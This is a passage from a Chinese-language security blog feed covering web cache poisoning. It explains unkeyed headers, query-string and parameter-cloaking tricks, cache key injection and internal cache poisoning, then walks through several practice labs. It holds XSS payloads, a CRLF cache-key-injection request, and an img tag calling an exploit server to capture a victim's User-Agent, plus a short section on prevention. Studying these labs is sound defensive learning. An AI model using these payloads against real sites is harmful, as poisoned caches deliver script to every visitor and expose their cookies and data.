<code>fetch</code>&#x2F;XHR&#x2F;innerHTML&#x2F;innerText&#x2F; document.write &#x2F; eval &#x2F; script src 动态生成点。</li><li>在 HTML 模板中找是否会反射 query&#x2F;header 到 DOM（查看源码或抓包响应）。</li><li>优先选“静态可缓存且会被执行&#x2F;插入”的资源（如 tracking.js）。</li></ul></li></ol><h3 id="利用缓存键缺陷："><a href="#利用缓存键缺陷：" class="headerlink" title="利用缓存键缺陷："></a>利用缓存键缺陷：</h3><ol><li><h3 id="无密钥端口"><a href="#无密钥端口" class="headerlink" title="无密钥端口"></a>无密钥端口</h3><p>这就是上面步骤2中的第3点</p><p>比如cache key中不包含HOST表头，所以可以构造HOST,让受害者在正常访问时读到你构造的HOST。</p><p>能造成的攻击，通常是重定向到新端口，或者js文件如果是直接在DOM拼接，就可以构造出xss攻击</p></li><li><h3 id="非键查询字符串（Unkeyed-query-string）"><a href="#非键查询字符串（Unkeyed-query-string）" class="headerlink" title="非键查询字符串（Unkeyed query string）"></a>非键查询字符串（Unkeyed query string）</h3><p>常见的 cache key 组成：cache key &#x3D; [HTTP 方法] + [URL 路径] + [查询字符串（query string）] + [Host 头]</p><p>有些缓存系统出于性能考虑，会在生成缓存键时 <strong>忽略查询字符串（?后面的部分）</strong></p><p>若构造出：就达成目的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /?msg=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>要是cache是按正常情况下把参数也放入rules，就可以再试试找有没有个别被屏蔽的参数，比如UTM参数，（用Param Miner去扫参数是能扫出来的）</p><p>还有如果<strong>Pragma: x-get-cache-key</strong>能用，甚至可能得到key</p></li><li><h3 id="缓存参数隐藏"><a href="#缓存参数隐藏" class="headerlink" title="缓存参数隐藏"></a>缓存参数隐藏</h3><p>这里我的理解就是在2 的基础上（通过参数得到攻击机会），服务器和Cache都保留参数，但可能存在差异，比如</p><p>构造&#x2F;<code>?a=1?b=2</code>,</p><ul><li><p>Cache会把第二个<code>?</code>后的排除，</p></li><li><p>而服务器把这一整句当做同一个参数，</p></li><li><p>这样就能让受害者读到a&#x3D;1的cache，而我们构造<code>?a=1?b=payload</code>的攻击。</p></li></ul><p>再比如  <code>/?a=1&amp;b=2;a=PAYLOAD</code>（Rails风格）</p><ul><li>Cache只认识 <code>&amp;</code>,只留下a&#x3D;1</li><li>服务器解析所有,并在存在重复参数情况下优先解析最后一个</li></ul><p>用这个思想也能利用JSONP（CORS的前辈），这是一种<strong>跨域数据请求的解决方案</strong>。他能用callback控制数据调用的函数名，通过用callback覆盖函数名为alert写入缓存就能完成xss。</p></li><li><h3 id="规范化Cache-rules"><a href="#规范化Cache-rules" class="headerlink" title="规范化Cache rules"></a>规范化Cache rules</h3><p>当你在参数中发现反射型 XSS 漏洞时，它实际上通常是无法利用的。因为现代浏览器在发送请求时通常会对必要的字符进行 URL 编码，而服务器不会对其进行解码。</p><p>但一些缓存实现在将带键的输入添加到缓存键时会对其进行规范化。在这种情况下，以下两个请求将具有相同的键：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /example?param=<span class="hljs-string">&quot;&gt;&lt;test&gt; </span><br><span class="hljs-string">GET /example?param=%22%3e%3ctest%3e</span><br></code></pre></td></tr></table></figure><p>即使服务器会编码一些语句阻止xss攻击，但是Cache可能会做规范化，（将编码前后认为是同一个key）然后对上了之前写入的缓存</p></li><li><h3 id="缓存键注入"><a href="#缓存键注入" class="headerlink" title="缓存键注入"></a>缓存键注入</h3><p>缓存键通常由若干组件拼接而成（例如 <code>path__Host__Accept</code>），如果拼接时<strong>不对组件里的分隔符进行转义&#x2F;分隔保护</strong>，攻击者可以把恶意内容“注入”到一个键组件里，造成两个原本不同请求被映射到相同的 cache key，从而实现缓存中毒或把 payload 通过普通 URL 分发给所有用户。</p><p>具体操作，比如 key：<code>path</code> $$ <code>origin</code>$$</p><p>于是你可以通过构造origin形成CRLF注入，或者构造成我们需要的key</p></li><li><h3 id="毒害内部缓存"><a href="#毒害内部缓存" class="headerlink" title="毒害内部缓存"></a>毒害内部缓存</h3><ul><li><strong>粒度更小</strong>：很多应用会把页面拆成多个可复用 <strong>片段（fragment &#x2F; snippet &#x2F; fragment cache）</strong> 并单独缓存这些片段（例如页头、脚本片段、广告区、语言包片段等）。</li><li><strong>无或弱 cache key</strong>：这些片段往往旨在“可复用”，可能没有严格的键策略或键很宽泛——<strong>一旦污染，会影响所有使用该片段的页面</strong>（不是单一 URL）。</li><li><strong>行为不标准、难以预测</strong>：内部缓存是应用自定义实现，可能在编码、解析、权限、有效性上有奇怪行为（例如对 header 解码、边界没有转义、fragment 按 header 值直接索引等）。</li><li><strong>难以发现</strong>：因为不是外部 CDN，客户端通常看不到 <code>X-Cache</code> &#x2F; <code>Age</code> 这类头；污染迹象更多体现在“响应混合来自不同时间的输入”上。</li></ul><p>举例后果：把一个常在每页注入 <code>&lt;script src=&quot;/shared/tracking.js&quot;&gt;</code> 的 fragment 污染成带恶意代码的脚本，等于一次投毒影响整个站点，范围巨大。</p><p>常见被缓存的片段类型（攻击面）</p><ul><li>页面头&#x2F;尾 HTML 片段（nav、header、footer）</li><li>多语言或本地化 JS（<code>/js/localize.js</code>）</li><li>通用 script&#x2F;include（tracking、analytics、widget）</li><li>模板片段（广告位、推荐块）</li><li>JSON 配置片段（供前端 fetch）</li><li>Server-side rendered partials（共享组件）</li></ul></li></ol><h2 id="预防放毒："><a href="#预防放毒：" class="headerlink" title="预防放毒："></a>预防放毒：</h2><ol><li>不要缓存动态或用户专属内容</li><li>不要把不可信输入直接纳入 cache-key（或裸拼接）</li><li>在边缘层（CDN&#x2F;Proxy）对可被缓存的字段做严格白名单</li><li>统一cache和源服务器的解析方式</li><li>对输入，输出，DOM回显做编码处理</li></ol><h2 id="模拟靶场："><a href="#模拟靶场：" class="headerlink" title="模拟靶场："></a>模拟靶场：</h2><h3 id="实验室：使用未加密的标头进行-Web-缓存中毒"><a href="#实验室：使用未加密的标头进行-Web-缓存中毒" class="headerlink" title="实验室：使用未加密的标头进行 Web 缓存中毒"></a>实验室：使用未加密的标头进行 Web 缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251019163150920.png"></p><p>直接甩给param Miner去扫header标头，</p><p> <img src="/2025/10/19/web-cache2/image-20251019164809221.png"><img src="/2025/10/19/web-cache2/image-20251019164728032.png"></p><p>于是加个X-forwarded-Host，在响应中能找到直接反射</p><p><img src="/2025/10/19/web-cache2/image-20251019164909372.png"></p><p>于是尝试各种构造出xss注入的方式</p><p><img src="/2025/10/19/web-cache2/image-20251019165939123.png"></p><p>但网页根本不给弹窗，改变思路，可能是利用资源导入漏洞,既然，既然服务器会直接读取这个静态文件，那试试通过构造让服务器读取我们的欺骗网址，里面写入xss语句</p><p><img src="/2025/10/19/web-cache2/image-20251019171132050.png"></p><p>不知道为什么不能加其他字符串 只有里面没有类似于helloword的普通字符串才行，有可能是解析文件是直接放入script标签内</p><p>然后再自己独有的URL上测试 ，发包写入缓存</p><p><img src="/2025/10/19/web-cache2/image-20251019172045889.png"></p><p>然后访问URL。成功读取Cache<img src="/2025/10/19/web-cache2/image-20251019172115792.png"></p><p>最后只要再访问量最大的那个网页上写入缓存，等待后续有人读缓存就能达成目的 解开实验，那流量最大的肯定是首页啊</p><p><img src="/2025/10/19/web-cache2/image-20251019172305722.png"></p><h3 id="实验室：使用未加密的-cookie-进行-Web-缓存中毒"><a href="#实验室：使用未加密的-cookie-进行-Web-缓存中毒" class="headerlink" title="实验室：使用未加密的 cookie 进行 Web 缓存中毒"></a>实验室：使用未加密的 cookie 进行 Web 缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251019173507838.png"></p><p>抓包发现，cookie内的内容会放到相应中，且题目说了cache不在缓存键中</p><p><img src="/2025/10/19/web-cache2/image-20251019174500644.png"></p><p>那就直接构造javascript语法</p><p><img src="/2025/10/19/web-cache2/image-20251019174545379.png"></p><p>再把路径改到主页 写入这个Cache即可</p><h3 id="实验室：具有多个标头的-Web-缓存中毒"><a href="#实验室：具有多个标头的-Web-缓存中毒" class="headerlink" title="实验室：具有多个标头的 Web 缓存中毒"></a>实验室：具有多个标头的 Web 缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251019212731043.png"></p><p>当访问my-account路由时，发现了重定向</p><p><img src="/2025/10/19/web-cache2/image-20251019213047929.png"></p><p>根据提示使用XFH和XFS时，跟随重定向，发现了重定向的规律</p><p><img src="/2025/10/19/web-cache2/image-20251019213637558.png"></p><p>经过测试得到结论：只要XFS不是HTTPS,就都会重定向，且重定向可用XFH指定。</p><p>服务器的特性找到了，接下来看到目标里面有没有能执行XSS（原来就是执行js的文件）的文件：</p><p>根目录响应中，这句说明了会把这个文件当 JavaScript执行，且看到里面也只有一句，和我们要构造的几乎一样</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/resources/js/tracking.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/19/web-cache2/image-20251019214823087.png"></p><p>拿出这个包：<img src="/2025/10/19/web-cache2/image-20251019215028032.png"></p><p>这样的话 会重定向到我们攻击者服务器，且会按原来的运行逻辑访问<code>resources/js/tracking.js</code>随后执行<code>javascript</code>脚本</p><p>cache服务器把<code>lab/resources/js/tracking.js</code>作为缓存键，所以访问时，把重定向响应存到了cache。</p><h3 id="实验室：使用未知标头进行有针对性的-Web-缓存投毒"><a href="#实验室：使用未知标头进行有针对性的-Web-缓存投毒" class="headerlink" title="实验室：使用未知标头进行有针对性的 Web 缓存投毒"></a>实验室：使用未知标头进行有针对性的 Web 缓存投毒</h3><p><img src="/2025/10/19/web-cache2/image-20251019221456484.png"></p><p>按照题目的要求，我们要做的  一个是获得特定用户的UA，一个是在Cache中写入alert(document.cookie)</p><p><img src="/2025/10/19/web-cache2/image-20251019223253040.png"></p><p>但不奏效，那就看看有没有原网站能生效的写法</p><p><img src="/2025/10/19/web-cache2/image-20251019223713016.png"></p><p>构造</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&quot;https://exploit-0a3f00fe037fbbbe80790cc601e500af.exploit-server.net/test&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>看攻击者服务器日志拿到UA<img src="/2025/10/19/web-cache2/image-20251019223943642.png"></p><p>用param Miner扩展猜测标头，得到几个<img src="/2025/10/19/web-cache2/image-20251019224745183.png"><img src="/2025/10/19/web-cache2/image-20251019224804961.png"></p><p>选择用X-Host看，发现是有回显的</p><p><img src="/2025/10/19/web-cache2/image-20251019225749175.png"></p><p>把test换成攻击服务器，攻击服务器中写入alert语句，测试成功（为了完成实验 记得把UA换成前面截取到的）</p><p><img src="/2025/10/19/web-cache2/image-20251019230747306.png"></p><h3 id="实验室：通过具有严格缓存标准的缓存利用-Web-缓存中毒来利用-DOM-漏洞"><a href="#实验室：通过具有严格缓存标准的缓存利用-Web-缓存中毒来利用-DOM-漏洞" class="headerlink" title="实验室：通过具有严格缓存标准的缓存利用 Web 缓存中毒来利用 DOM 漏洞"></a>实验室：通过具有严格缓存标准的缓存利用 Web 缓存中毒来利用 DOM 漏洞</h3><p><img src="/2025/10/19/web-cache2/image-20251019235312055.png"></p><p> 把根目录发给para Miner找标头<img src="/2025/10/19/web-cache2/image-20251020001153373.png"></p><p>尝试写入，得到我们更改的data json数据</p><p><img src="/2025/10/19/web-cache2/image-20251020001232985.png"></p><p>查看静态文件，看到了解析规则<img src="/2025/10/19/web-cache2/image-20251020001332616.png"></p><p>结合跟页面的代码<img src="/2025/10/19/web-cache2/image-20251020001508617.png"></p><p>于是在攻击者页面写入<img src="/2025/10/19/web-cache2/image-20251020001532956.png"></p><p>（在头部添加<code>Access-Control-Allow-Origin: *</code>）CORS是为了防止<strong>恶意脚本未经授权访问其他域的资源和数据</strong></p><p>发包写入Cache即可</p><h3 id="实验室：结合-Web-缓存中毒漏洞"><a href="#实验室：结合-Web-缓存中毒漏洞" class="headerlink" title="实验室：结合 Web 缓存中毒漏洞"></a>实验室：结合 Web 缓存中毒漏洞</h3><p><img src="/2025/10/19/web-cache2/image-20251020004819824.png"></p><p>进靶场，把根目录交给param Miner，随后直接能看到的是两个点</p><p>第一个：cookie，<img src="/2025/10/19/web-cache2/image-20251020010135230.png"></p><p>注意到lang直接明文在cookie中，查看处理逻辑<img src="/2025/10/19/web-cache2/image-20251020010209338.png"></p><p>第二个： 扫出      ‘x-forwarded-host~%s.%h’.    </p><p><img src="/2025/10/19/web-cache2/image-20251020010311507.png"></p><p>后面大概就是根据\resources\js\translations.js代码解析json<img src="/2025/10/19/web-cache2/image-20251020010600701.png"></p><p>审计一下这个js,(只取关键部分)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">initTranslations</span>(<span class="hljs-params">jsonUrl</span>) <span class="hljs-comment">//处理cookie部分</span><br>&#123;<br>    <span class="hljs-keyword">const</span> lang = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;;&#x27;</span>)<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>))<br>        .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;lang&#x27;</span>)<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p[<span class="hljs-number">1</span>])<br>        .<span class="hljs-title function_">find</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-literal">true</span>);<br><span class="hljs-title function_">fetch</span>(jsonUrl)  <span class="hljs-comment">//处理json数据</span><br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>())<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">j</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> select = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;lang-select&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (select) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> code <span class="hljs-keyword">in</span> j) &#123;<br>                <span class="hljs-keyword">const</span> name = j[code].<span class="hljs-property">name</span>;<br>                <span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;option&quot;</span>);<br>                el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;value&quot;</span>, code);<br>                el.<span class="hljs-property">innerText</span> = name;<br>                select.<span class="hljs-title function_">appendChild</span>(el);<br>                <span class="hljs-keyword">if</span> (code === lang) &#123;<br>                    select.<span class="hljs-property">selectedIndex</span> = select.<span class="hljs-property">childElementCount</span> - <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        lang <span class="hljs-keyword">in</span> j &amp;&amp; lang.<span class="hljs-title function_">toLowerCase</span>() !== <span class="hljs-string">&#x27;en&#x27;</span> &amp;&amp; j[lang].<span class="hljs-property">translations</span> &amp;&amp; <span class="hljs-title function_">translate</span>(j[lang].<span class="hljs-property">translations</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&#x27;maincontainer&#x27;</span>)[<span class="hljs-number">0</span>]);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/19/web-cache2/image-20251020011838792.png"></p><p>然后对比一下发现首页好像只有View details，于是尝试在这里做手脚</p><p><img src="/2025/10/19/web-cache2/image-20251020012614585.png"></p><p>情况就是污染一个语言 然后对这个语言进行写Cache操作，但在测试时，读操作却出问题了，选不了语言了，只能使用默认的EN</p><p><img src="/2025/10/19/web-cache2/image-20251020012600278.png"></p><p>碰到瓶颈，又看到切换语言时，有重定向操作<img src="/2025/10/19/web-cache2/image-20251020012900595.png"></p><p>然后注意到目标里又扫到一个表头<img src="/2025/10/19/web-cache2/image-20251020013450157.png">看看这个标头有什么用</p><p><img src="/2025/10/19/web-cache2/image-20251020014022161.png"></p><p><code>X-Original-Url</code> 是一个非标准的 HTTP 请求头，主要用于在代理服务器（如反向代理、负载均衡器）转发请求时，向后端服务器传递<strong>客户端原始请求的 URL 路径</strong>，解决代理转发过程中 URL 被修改导致的路径识别问题。</p><p>那肯定就想到把原始URL设置为我想要的en-gb</p><p><img src="/2025/10/19/web-cache2/image-20251020014926501.png"></p><p>但是有set-cookies，用反斜杠成功了<img src="/2025/10/19/web-cache2/image-20251020015114611.png"></p><p>看到这个重定向也有缓存，那就把地址污染和语言重定向一并写入&#x2F;目录的缓存，顺序重放两个请求,这样受害者就能同时读两个Cache</p><p><img src="/2025/10/19/web-cache2/image-20251020234237627.png"></p><h3 id="实验室：通过非密钥查询字符串进行-Web-缓存中毒"><a href="#实验室：通过非密钥查询字符串进行-Web-缓存中毒" class="headerlink" title="实验室：通过非密钥查询字符串进行 Web 缓存中毒"></a>实验室：通过非密钥查询字符串进行 Web 缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251021135837393.png"></p><p>把首页抓包到repeater测试，当把GET &#x2F;?aa&#x3D;11放进内存时，再访问GET &#x2F;?aas&#x3D;11s读到了Cache，说明参数不在cache key里面</p><p><img src="/2025/10/19/web-cache2/image-20251021154310398.png"></p><p>而同时发现参数会出现在响应中</p><p><img src="/2025/10/19/web-cache2/image-20251021154459096.png"></p><p>就是利用cache rules会去掉参数，但服务器会解析参数并反射的特点，构造alert让受害者读入</p><p>我的构造：</p><p><img src="/2025/10/19/web-cache2/image-20251021154907912.png"></p><p>验证，去掉参数确实还是能读到缓存</p><p><img src="/2025/10/19/web-cache2/image-20251021155045778.png"></p><p>然后最后我们再看看提示说的标头<img src="/2025/10/19/web-cache2/image-20251021155530718.png"></p><h3 id="实验室：通过非密钥查询参数进行-Web-缓存中毒"><a href="#实验室：通过非密钥查询参数进行-Web-缓存中毒" class="headerlink" title="实验室：通过非密钥查询参数进行 Web 缓存中毒"></a>实验室：通过非密钥查询参数进行 Web 缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251021155931847.png"></p><p>这次发现参数也会存入缓存，猜测UTM参数是被排除的参数，与此同时，param miner也扫出来了</p><p><img src="/2025/10/19/web-cache2/image-20251021160901496.png"></p><p>说明cache rules自动屏蔽了UTM_content参数，这个参数通常是用于<strong>追踪网络营销活动的流量来源、媒介、内容等信息</strong></p><p><img src="/2025/10/19/web-cache2/image-20251021161505595.png"></p><h3 id="实验室：参数隐藏"><a href="#实验室：参数隐藏" class="headerlink" title="实验室：参数隐藏"></a>实验室：参数隐藏</h3><p><img src="/2025/10/19/web-cache2/image-20251021170747697.png"></p><p>首先通过简单的测试知道了cache会检测参数保存，而且会对<code>&lt;&gt;</code>进行HTML编码。</p><p><img src="/2025/10/19/web-cache2/image-20251021175304760.png"></p><p>扫head也没扫出东西 但是扫出无效参数<code>utm_content</code>，还扫出了参数隐藏，就是解析方式差异</p><p><img src="/2025/10/19/web-cache2/image-20251021172854852.png"></p><p>猜测是服务器接受所有，Cache不解析分号<code>;</code></p><p>最后的测试：GET &#x2F;?utm_content&#x3D;1;a&#x3D;1的缓存用GET &#x2F; 能读到</p><p>但是考虑到上面测试位置对符号的编码，放弃这个位置，在下面找到了其他可用点，在访问主界面时会自动调用这个src</p><p><img src="/2025/10/19/web-cache2/image-20251021175414661.png"></p><p>看看这个文件</p><p><img src="/2025/10/19/web-cache2/image-20251021180107389.png"></p><p>那就想是不是可以受害者读到这个src的Cache，但我们对这进行污染，写入带有xss的缓存</p><p>发现可以通过编辑参数来控制对返回数据调用的函数的名称<code>callback</code></p><p><img src="/2025/10/19/web-cache2/image-20251021182615351.png"></p><p>然后利用服务器针对同名参数会优先使用最后一个的特性，写一个缓存以为是callback&#x3D;setCountryCookie，实际上服务器写入的是callback&#x3D;alert(1)的poc</p><p><img src="/2025/10/19/web-cache2/image-20251021183403414.png"></p><p>在服务器视角里就是解析为：utm_content&#x3D;1和callback&#x3D;alert(1)</p><p>在cache解析为：callback&#x3D;setCountryCookie</p><p>因为UTM被屏蔽掉，而且Cache不解析<code>;</code>，把它当作普通字符串作为了UTM的值，导致UTM开始的所有被Cache清楚了。</p><h3 id="实验：通过胖GET请求进行Web缓存中毒"><a href="#实验：通过胖GET请求进行Web缓存中毒" class="headerlink" title="实验：通过胖GET请求进行Web缓存中毒"></a>实验：通过胖GET请求进行Web缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251021184230894.png"></p><p>测试下来本实验没有CAche不排除的参数，也没有分隔符解析问题</p><p>胖GET就是在GET请求的同时，直接用POST传参（或者覆盖）</p><p><img src="/2025/10/19/web-cache2/image-20251021200313309.png"></p><p>有时候不能直接用胖Get，有些可以X-HTTP-Method-Override: POST覆盖</p><h3 id="实验室：URL-规范化"><a href="#实验室：URL-规范化" class="headerlink" title="实验室：URL 规范化"></a>实验室：URL 规范化</h3><p><img src="/2025/10/19/web-cache2/image-20251021201642529.png"></p><p>任意访问不存在的文件，发现回显存在漏洞，似乎可以直接反射xss</p><p><img src="/2025/10/19/web-cache2/image-20251021203648428.png"></p><p><img src="/2025/10/19/web-cache2/image-20251021204732618.png"></p><p>直接把xss写入缓存，然后发给服务器读缓存</p><p>（这里用服务器直接写入是会编码的，但bp发过去就不会，所以缓存就会存下未编码的）</p><p>即使服务器会编码这些语句阻止xss攻击，但是Cache可能会做规范化，自动解码，然后对上了之前写入的缓存</p><h3 id="实验：缓存键注入"><a href="#实验：缓存键注入" class="headerlink" title="实验：缓存键注入"></a>实验：缓存键注入</h3><p><img src="/2025/10/19/web-cache2/image-20251021213548810.png"></p><p>首先发包主页面，发现是跳转页，且有缓存</p><p><img src="/2025/10/19/web-cache2/image-20251021214702490.png"></p><p>加上pragma参数看看更多缓存信息，同时Param扫出了Cache忽略的参数utm_content，还有扫出<code>;</code>符号会被Cache识别为字符串。</p><p><img src="/2025/10/19/web-cache2/image-20251021214844498.png"></p><p>看到标头里有个<code>Vary</code> 用于告诉缓存系统：<strong>“当前响应的内容会根据哪些请求头的不同而变化，请根据这些请求头来区分缓存”</strong></p><p>跟随跳转看看，</p><p><img src="/2025/10/19/web-cache2/image-20251021215204347.png"></p><p>发现参数直接回显到相应，那第一时间就试试直接构造xss，但是被HTML编码了，而且目前不加入缓存</p><p><img src="/2025/10/19/web-cache2/image-20251021215251132.png"></p><p>于是加上<code>origin</code>到原本有缓存机制的地方看看，这后面一定用得上</p><p><img src="/2025/10/19/web-cache2/image-20251022000832522.png"></p><p>没辙了，找找有没有其他静态文件，找到js&#x2F;localize.js，并且发现可以根据更改参数控制响应脚本（但是）</p><p><img src="/2025/10/19/web-cache2/image-20251022001511224.png"></p><p>加上前面找到的header看看</p><p><img src="/2025/10/19/web-cache2/image-20251022001945132.png"></p><p>到现在总结一下有用的东西：1.排除的参数utm_content ； 2.Cache不识别<code>;</code> 3.Oringe可加入Cache key 4.有用的header：Pragma: x-get-cache-key 5.utm参数后面的编码会被cache当做普通字符，服务器会解析</p><p><img src="/2025/10/19/web-cache2/image-20251022131241426.png"><img src="/2025/10/19/web-cache2/image-20251022133014385.png"><img src="/2025/10/19/web-cache2/image-20251022133043230.png"></p><p>于是就是先想办法把响应构造成alert(1),先把参数cors改为1（可能就能运行跨域请求），</p><p>然后原来的key下面还有个content-len 我们伪造一下，就是注入origin&#x3D;x<code>\r\n</code>Content-Length: 8<code>\r\n</code>alert(1)</p><p><img src="/2025/10/19/web-cache2/image-20251022005137856.png"></p><p>后面就是考虑怎么存入这个Cache的同时，利用差异让受害者正常访问但是确实踩到这个Cache</p><p>就是缓存以为是lang&#x3D;en&amp;cors&#x3D;0    我给服务器的得是cors&#x3D;1</p><p>根据上面的构造条件，最后重新理一下思路：</p><ol><li>首先就是先构造Cache key注入，让js文件变成xss文件：就是添加origin伪造响应body：</li></ol><p><img src="/2025/10/19/web-cache2/image-20251022142539263.png"></p><ol start="2"><li><p>随后是利用重定向文件，让Cache key还是受害者都会访问的<code>/login?lang=en$$</code> 但定位到的地址得是能访问到我们写入xss js文件的网页。</p><p>那就利用cacherules排除utm_content的机制，让重定向请求是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /login?lang=en?utm_content=x%26cors=<span class="hljs-number">1</span>$$origin=x%250d%250aContent-<span class="hljs-title class_">Length</span>:%<span class="hljs-number">208</span>%250d%250a%250d%250aalert(<span class="hljs-number">1</span>)%<span class="hljs-number">23</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="/2025/10/19/web-cache2/image-20251022143132989.png"></p><p>这里就是成功做到了 cache完全忽略了utm后面的所有，但服务器重定向能过去</p><p>看看重定向的网页下面</p><p><img src="/2025/10/19/web-cache2/image-20251022143359296.png"></p></li><li><p>但是这个js路径并不是我最开始写入Cache的那个路径，回头重新改一下js的cache key，其实可以先看一下浏览器怎么处理</p><p><img src="/2025/10/19/web-cache2/image-20251022144056001.png"></p><p>然后用一样的路径写入一下，其实就是加一个utm_content</p><p><img src="/2025/10/19/web-cache2/image-20251022143601254.png"></p><p>我们这里可以看到 其实就是key里是<code>?cors</code> 但是直接改&amp;为?是不行的，因为服务器不会把第二个问号解析问参数。直接用上面浏览器的处理方式写缓存就行了</p><p>两个细节：</p><ol><li>二次编码<img src="/2025/10/19/web-cache2/image-20251022145502171.png"></li><li>为什么是origin&#x3D;不是origin：</li></ol></li></ol><h3 id="实验室：内部缓存中毒"><a href="#实验室：内部缓存中毒" class="headerlink" title="实验室：内部缓存中毒"></a>实验室：内部缓存中毒</h3><p><img src="/2025/10/19/web-cache2/image-20251022224243100.png"></p><p>看到有陌生文件，同时找到与其有联系的静态文件resources&#x2F;js&#x2F;analytics.js</p><p><img src="/2025/10/19/web-cache2/image-20251022224322649.png"></p><p><img src="/2025/10/19/web-cache2/image-20251022224333102.png"></p><p>审计一下源码，是随机生成16位字符串，然后param miner扫出了标头</p><p><img src="/2025/10/19/web-cache2/image-20251022230955752.png"></p><p>然后测试一下看看有什么用</p><p><img src="/2025/10/19/web-cache2/image-20251022235502970.png"></p><p>会在响应里回显，最先尝试了构造注入，但是没用。</p><p>重新抓一个包，改成我们的攻击者服务器，发几次包</p><p><img src="/2025/10/19/web-cache2/image-20251022235635261.png"></p><p>发现js&#x2F;geolocate.js的路劲被覆盖了。等于是可以用我们的服务器写入缓存了</p><p><img src="/2025/10/19/web-cache2/image-20251022235722362.png"></p><p>这里有个blog写的不错，有参考:</p><p>​<a href="https://zrquan.github.io/posts/web-cache/">存储投毒</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web缓存欺骗</title>
    <link href="/2025/10/15/web-cache/"/>
    <url>/2025/10/15/web-cache/</url>
    
    <content type="html"><![CDATA[<p>  在这篇文章中，记录最近看到的web缓存相关的安全知识，并且附上相关渗透及漏洞利用实验。</p><p> Cache欺骗和Cache投毒的区别：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**欺骗**</span>主要是利用源服务器和Cache端之间的解析差异，让受害者写入包含敏感信息的缓存，动态信息误入缓存，攻击者读取Cache窃取信息。<br><span class="hljs-code">通常是在后缀，目录名，文件名上找解析漏洞做文章；且一般都需要发送恶意链接让受害者写入缓存</span><br><span class="hljs-code">**投毒**主要是攻击者利用cache rules/key上漏洞， 把受污染的静态文件写入缓存，受害者在正常上网时，就读取了污染文件，收到xss类似的攻击。</span><br><span class="hljs-code">通常逻辑是利用Cache rules不包含（及不会写入key）的注入点（各种header的忽略，参数上的解析差异），直接在缓存中写入DOM或者导入含毒的静态文件</span><br></code></pre></td></tr></table></figure><h1 id="Web缓存欺骗-（Web-cache-deception）"><a href="#Web缓存欺骗-（Web-cache-deception）" class="headerlink" title="Web缓存欺骗  （Web 